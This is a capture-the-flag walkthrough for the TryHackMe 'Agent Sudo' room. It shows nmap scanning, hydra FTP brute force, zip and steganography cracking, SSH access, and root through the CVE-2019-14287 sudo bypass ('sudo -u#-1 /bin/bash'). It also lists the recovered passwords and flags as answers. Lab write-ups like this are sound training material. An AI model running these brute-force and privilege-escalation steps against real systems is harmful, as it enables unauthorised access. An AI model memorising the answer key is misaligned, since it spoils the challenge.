---
description: https://tryhackme.com/room/agentsudoctf
---

# Agent Sudo

## INIT

```
export agentsudo=10.10.172.140
ping $agentsudo

echo "10.10.172.140 agentsudo.thm" >> /etc/hosts
```

## Task 2 Enumerate

```
nmap -v -sC -sV -O -T5 -p1-65535 agentsudo.thm
```

### How many open ports?

![](<../.gitbook/assets/image (431).png>)

{% hint style="success" %}
3
{% endhint %}

### How you redirect yourself to a secret page?

![](<../.gitbook/assets/image (430).png>)

> Switch User-Agent to C

![](<../.gitbook/assets/image (432).png>)

{% hint style="success" %}
User-Agent
{% endhint %}

### What is the agent name?

{% hint style="success" %}
Chris
{% endhint %}

## Task 3 Hash cracking and brute-force

### FTP password

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agentsudo.thm -t 50
```

![](<../.gitbook/assets/image (433).png>)

{% hint style="success" %}
crystal
{% endhint %}

### Zip file password&#x20;

![](<../.gitbook/assets/image (434).png>)

```
binwalk -e cutie.png

zip2john 8702.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](<../.gitbook/assets/image (436).png>)

{% hint style="success" %}
alien
{% endhint %}

### steg password&#x20;

```
steghide extract -sf cute-alien.jpg
```

![](<../.gitbook/assets/image (437).png>)

{% hint style="success" %}
Area51
{% endhint %}

### Who is the other agent (in full name)?&#x20;

{% hint style="success" %}
james
{% endhint %}

### SSH password

{% hint style="success" %}
hackerrules!
{% endhint %}

## Task 4 Capture the user flag

### What is the user flag?

![](<../.gitbook/assets/image (438).png>)

{% hint style="success" %}
b03d975e8c92a7c04146cfa7a5a313c7
{% endhint %}

### What is the incident of the photo called?

```
scp james@agentsudo.thm:/home/james/Alien_autospy.jpg .
```

![](<../.gitbook/assets/image (439).png>)

{% hint style="success" %}
Roswell Alien Autopsy
{% endhint %}

## Task 5 Privilege escalation

```
sudo -l
```

![](<../.gitbook/assets/image (441).png>)

### CVE number for the escalation&#x20;

![](<../.gitbook/assets/image (442).png>)

![](<../.gitbook/assets/image (440).png>)

{% hint style="success" %}
CVE-2019-14287
{% endhint %}

### What is the root flag?&#x20;

```
sudo -u#-1 /bin/bash
cat /root/root.txt
```

{% hint style="success" %}
b53a02f55b57d4439e3341834d70c062
{% endhint %}

### (Bonus) Who is Agent R?

![](<../.gitbook/assets/image (444).png>)

{% hint style="success" %}
DesKel
{% endhint %}
